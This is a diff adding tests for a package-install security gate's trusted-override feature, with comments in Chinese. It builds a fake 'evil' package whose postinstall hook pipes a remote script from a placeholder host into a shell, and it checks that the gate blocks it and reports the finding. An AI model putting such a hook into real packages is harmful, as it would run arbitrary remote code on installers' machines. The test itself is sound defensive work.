@@ -304,3 +304,92 @@ describe('gate output', () => {
     }
   })
 })
+
+describe('trusted override', () => {
+  /**
+   * 造一个命中 GT001 的包装：postinstall 把远程脚本管道进 shell。
+   * 用真实 tarball 走完整链路（取元数据 → 下载 → 内存解压 → 审 → 判定），
+   * 而不是直接调 evaluateGateRules，这样 trusted 参数与判定顺序一起被覆盖。
+   */
+  const evil = makeTarGz({
+    'package/package.json': JSON.stringify({
+      name: 'evil', version: '1.0.0',
+      scripts: { postinstall: 'curl -fsSL https://example.com/x.sh | sh' },
+    }),
+    'package/index.js': 'module.exports = 1\n',
+  })
+
+  /** 一次 stub 同时应付两次请求：packument 与 tarball。 */
+  function stubRegistry(): void {
+    vi.stubGlobal('fetch', async (input: unknown) => {
+      const url = String(input)
+      if (url.endsWith('.tgz')) return new Response(evil, { status: 200 })
+      return new Response(JSON.stringify({
+        versions: { '1.0.0': { dist: { tarball: 'https://registry.example/evil-1.0.0.tgz' } } },
+        'dist-tags': { latest: '1.0.0' },
+      }), { status: 200, headers: { 'content-type': 'application/json' } })
+    })
+  }
+
+  it('blocks when the package is not trusted', async () => {
+    stubRegistry()
+    try {
+      const result = await gateSpec('evil@1.0.0', { registry: 'https://registry.example/' })
+      expect(result.decision).toBe('block')
+      expect(result.findings.map(finding => finding.id)).toContain('GT001')
+      expect(result.trustedOverride).toBeUndefined()
+    } finally {
+      vi.unstubAllGlobals()
+    }
+  })
+
+  it('passes a trusted package but keeps every finding in the report', async () => {
+    stubRegistry()
+    try {
+      const result = await gateSpec('evil@1.0.0', {
+        registry: 'https://registry.example/',
+        trusted: ['evil'],
+      })
+      expect(result.decision).toBe('pass')
+      expect(result.trustedOverride).toBe(true)
+      // 关键：放行不等于抹掉证据。findings 必须还在，报告要如实写出命中了什么，
+      // 否则用户下次看到「通过」会以为是干净的。
+      expect(result.findings.map(finding => finding.id)).toContain('GT001')
+      expect(gateJson(result).trustedOverride).toBe(true)
+
+      const plain = gatePlainLines(result).join('\n')
+      expect(plain).toContain('信任清单')
+      expect(plain).toContain('/doctor untrust evil')
+      expect(gateMarkdownLines(result).join('\n')).toContain('信任清单')
+    } finally {
+      vi.unstubAllGlobals()
+    }
+  })
+
+  it('does not vouch for a different package', async () => {
+    stubRegistry()
+    try {
+      const result = await gateSpec('evil@1.0.0', {
+        registry: 'https://registry.example/',
+        trusted: ['some-other-pkg'],
+      })
+      expect(result.decision).toBe('block')
+      expect(result.trustedOverride).toBeUndefined()
+    } finally {
+      vi.unstubAllGlobals()
+    }
+  })
+
+  it('matches the trusted name case-insensitively', async () => {
+    stubRegistry()
+    try {
+      const result = await gateSpec('evil@1.0.0', {
+        registry: 'https://registry.example/',
+        trusted: ['EVIL'],
+      })
+      expect(result.trustedOverride).toBe(true)
+    } finally {
+      vi.unstubAllGlobals()
+    }
+  })
+})
